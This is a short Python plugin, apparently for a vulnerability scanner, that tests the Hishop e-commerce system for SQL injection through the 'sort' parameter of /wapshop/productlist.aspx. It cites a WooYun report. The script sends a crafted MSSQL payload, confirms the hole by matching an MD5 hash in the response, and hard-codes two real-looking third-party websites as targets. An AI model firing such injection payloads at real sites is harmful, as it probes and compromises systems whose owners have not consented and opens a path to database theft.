#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Hishop系统productlist.aspx SQL注入
author: Lucifer
referer: http://www.wooyun.org/bugs/wooyun-2015-0154499
description: Hishop易分销系统/wapshop/productlist.aspx文件中参数sort存在注入
'''

import re

def assign(service, arg):
    if service == "hishop":
        return True, arg

def audit(arg):
    url = arg + "wapshop/productlist.aspx?sort=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27)))"
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 500 or code == 200:
        if '81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole('Hishop SQL inj'+':'+url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('hishop', 'http://www.gzkorea.com/')[1])
    audit(assign('hishop', 'http://www.nnjt365.com/')[1])